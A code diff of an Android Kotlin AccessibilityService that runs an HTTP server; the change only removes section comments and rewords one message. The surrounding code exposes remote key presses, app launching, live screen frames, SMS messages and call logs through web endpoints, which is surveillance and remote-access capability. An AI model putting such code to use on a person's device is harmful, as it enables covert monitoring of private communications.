@@ -113,7 +113,6 @@ class RemoteControlService : AccessibilityService() {
             val uri = session.uri
             val params = session.parameters
 
-            // 1. Navigation Action Handlers
             if (uri == "/key") {
                 when (params["action"]?.firstOrNull()) {
                     "back" -> performGlobalAction(GLOBAL_ACTION_BACK)
@@ -124,7 +123,6 @@ class RemoteControlService : AccessibilityService() {
                 return newFixedLengthResponse("OK")
             }
 
-            // 2. Launch Application
             if (uri == "/launch") {
                 val pkg = params["pkg"]?.firstOrNull()
                 if (!pkg.isNullOrEmpty()) {
@@ -139,7 +137,6 @@ class RemoteControlService : AccessibilityService() {
                 }
             }
 
-            // 3. Screen Frame Endpoint
             if (uri == "/api/screen") {
                 val bytes = ScreenCaptureService.latestJpegBytes
                 return if (bytes != null && bytes.isNotEmpty()) {
@@ -154,15 +151,13 @@ class RemoteControlService : AccessibilityService() {
                     res.addHeader("Expires", "0")
                     res
                 } else {
-                    newFixedLengthResponse(Response.Status.NO_CONTENT, "text/plain", "Waiting for capture frame...")
+                    newFixedLengthResponse(Response.Status.NO_CONTENT, "text/plain", "No frame available")
                 }
             }
 
-            // 4. Data Endpoints
             if (uri == "/api/sms") return newFixedLengthResponse(Response.Status.OK, "text/html", getSmsHtml())
             if (uri == "/api/calls") return newFixedLengthResponse(Response.Status.OK, "text/html", getCallLogsHtml())
 
-            // 5. Installed Apps
             val pm = packageManager
             val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                 .filter { pm.getLaunchIntentForPackage(it.packageName) != null }
@@ -177,7 +172,6 @@ class RemoteControlService : AccessibilityService() {
                         .append("')\">Open</button></li>")
             }
 
-            // 6. Web Dashboard
             val html = """
                 <!DOCTYPE html>
                 <html>
